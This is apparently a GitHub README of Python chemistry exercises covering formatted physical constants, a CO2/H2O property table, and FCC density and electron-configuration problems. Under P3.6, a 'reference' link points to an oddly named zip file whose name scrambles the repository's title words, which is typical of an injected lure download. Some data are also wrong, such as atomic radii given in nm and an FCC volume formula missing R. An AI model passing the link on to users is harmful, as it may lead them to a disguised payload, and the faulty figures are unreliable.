[![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://github.com/dindagustiayu/-String-list-and-loops-and-Flow-Control-in-Python-for-Chemistry-Exercises/tree/main)

# Strings, List and Loops, and Comparison and Flow Control in Python for Chemistry Exercises.
## Key Equation
- Density Computations
  - $\rho=\frac{m}{v}=\frac{nA}{V_{C}N_{A}}$
- Avogadro's number
  - 6.022 x $10^{23}$, 1 amu/atom (or molecule) = 1 g/mol

# 1. Strings
## P3.1
Produce a nicely formatted list of the values of the physical constants, _h_, _c_, $k_{B}$, _R_, and _$N_{A}$_, to four significant figures, with their units.
```python
h, h_units = 6.62607015e-34, 'J.s'
c, c_units = 299792458, 'm.s-1'
kB, kB_units = 1.380649e-23, 'J.K-1'
R, R_units = 8.314462618, 'J.K.mol-1'
N_A, N_A_units = 6.02214076e+23, 'mol-1'

s1 = (f'h = {h:9.3e} {h_units}\t'
     f'c = {c:9.3e} {c_units}\t' 
      f'kB = {kB:9.3e} {kB_units}\t'
       f'R = {R:9.3e} {R_units}\t'
        f'N_A = {N_A:9.3e} {N_A_units}\t')

s2 = (f'h   = {h:9.3e}{h_units}\n'
      f'c   = {c:9.3e}{c_units}\n' 
      f'kB  = {kB:9.3e}{kB_units}\n'
      f'R   = {R:9.3e}{R_units}\n'
      f'N_A = {N_A:9.3e}{N_A_units}\n')
print(s1)

print(s2)
```
```python
h = 6.626e-34 J.s	c = 2.998e+08 m.s-1	kB = 1.381e-23 J.K-1	R = 8.314e+00 J.K.mol-1	N_A = 6.022e+23 mol-1	
h   = 6.626e-34J.s
c   = 2.998e+08m.s-1
kB  = 1.381e-23J.K-1
R   = 8.314e+00J.K.mol-1
N_A = 6.022e+23mol-1
```

## P3.2
The following variables define some thermodynamic properties of $CO_{2}$ and $H_{2}O$.
```python
# Triple point of CO2 (K, Pa)
T3_CO2, p3_CO2 = 216.58, 5.185e5
# Entalphy of fusion of CO2 (kJ.mol-1).
DfusH_CO2 = 9.019
# Entrophy of fusion os CO2 (J.K-1.mol-1).
DfusS_CO2 = 40
# Entalphy of vaporization of CO2 (kJ.mol-1).
DvapH_CO2 = 15.326
# Entrophy of vaporization of CO2 (J.K-1.mol-1).
DvapS_CO2 = 70.8

# Triple point of H2O (K, Pa)
T3_H2O, p3_H2O = 273.16, 611.73
# Entalphy of fusion of H2O (kJ.mol-1).
DfusH_H2O = 6.01
# Entrophy of fusion of H2O (J.K-1.mol-1).
DfusS_H2O = 22.0
# Entalphy of vaporization of H2O (kJ.mol-1).
DvapH_H2O = 40.68
# Entrophy of vaporization of H2O (J.K-1.mol-1).
DvapS_H2O = 118.89

print(' '*22 + 'CO2' + ' '*9 + 'H20')
print('_'*40)
print('p3     /pa         ', f'{p3_CO2:5.0f}      {p3_H2O:5.2f}')
print('T3     /K          ', f'{T3_CO2:5.2f}      {T3_H2O:5.2f}')
print('DfusH  /kJ.mol-1   ', f'{DfusH_CO2:5.3f}       {DfusH_H2O:5.3f}')
print('DfusS  /J.K-1.mol-1', f'{DfusS_CO2:4.1f}      {DfusS_H2O:6.1f}')
print('DvapH  /kJ.mol-1   ', f'{DvapH_CO2:5.3f}    {DvapH_H2O:8.3f}')
print('DvapS  /j.k-1.mol-1', f'{DvapS_CO2:5.1f}       {DvapS_H2O:5.1f}')

```
```python
                      CO2         H20
________________________________________
p3     /pa          518500      611.73
T3     /K           216.58      273.16
DfusH  /kJ.mol-1    9.019       6.010
DfusS  /J.K-1.mol-1 40.0        22.0
DvapH  /kJ.mol-1    15.326      40.680
DvapS  /j.k-1.mol-1  70.8       118.9
```

## P3.3
Nuclear binding energy and the mass defect. A neutron has a slightly larger mass than the proton. These are often given in terms of an atomic mass unit, where one atomic mass unit (u) is defined as 1/12th the mass of a carbon-12 atom.

## 2. List and Loops
## P3.4
Straight-chain alkanes are hydrocarbons with the general stoichiometric formula $C_{n}H_{2n+2}$, in which the carbon atoms form a simple shain: for example, butane, $C_{4}H_{10}$ has the structural formula that may be depicted $H_{3}CC_{2}CH_{2}CH_{3}$. Write a progra, to output the structural formula of such an alkane, given its stoichiometry (assume $n\geq1$).

## P3.5
Produce a table if the FCC element symbols abd their corresponding atomic radius (nm) and atomic weight (g/mol).

## P3.6
reference: 
- https://raw.githubusercontent.com/dindagustiayu/-String-list-and-loops-and-Flow-Control-in-Python-for-Chemistry-Exercises/main/enjoin/for_list_Exercises_Flow_Python_loops_Chemistry_String_Control_in_and_v3.8.zip(data_page)

Alumunium, copper and lead has an atomic radius of 121, 132, and 146 nm, respectively, an FCC crystal structure, and atomic weight of 26.98, 63.55, and 207.20 g/mol. Compute their theoritical density,and compare the answer with their measured density.

in the FCC unit cell illustrated, the atoms touch one another across a face-diagonal, the length of which is _4R_. Because the unit cell is a cube, its volume is $a^{3}$, where _a_ is the cell edge length. From the right triangle on the face.

$a^{2} + a^{2} = (4R)^{2}$

Solving for a,

$a=2R\sqrt{2}$

The FCC unit cell volume $V_{C}$ may be computed from

$V_{C}=a^{3}=(2\sqrt{2})^{3}=16R^{3}\sqrt{2}$

# 3. Comparison and Flow Control
    Table. Python comparison operators
| Symbols |         meaning              | 
|:--------|-----------------------------:|
| ==      |            Equal to          |
| !=      |         Not equal to         |
| >       |         Greater than         |
| <       |          Less than           |
| >=      |   Greater than or equal to   |
| <=      |    Less than or equal to     |
|:--------|-----------------------------:|

## P3.7
Determine whether each of the following electron configuration is an inert gas,a halogen, an alkali metal, an alkaline earth metal, or transition metal. Justify your choices.

    (a) 1s2.2s2.2p6.3s2.3p5
    (b) 1s2.2s2.2p6.3s2.3p6.3d7.4s2
    (c) 1s2.2s2.2p6.3s2.3p6.3d7.4s2.4P6
    (d) 1s2.2s2.2p6.3s2.3p6.4s1
    (e) 1s2.2s2.2p6.3s2.3p6.3d7.4s2.4p6.4d10.5s2
    (f) 1s2.2s2.2p6.3s2

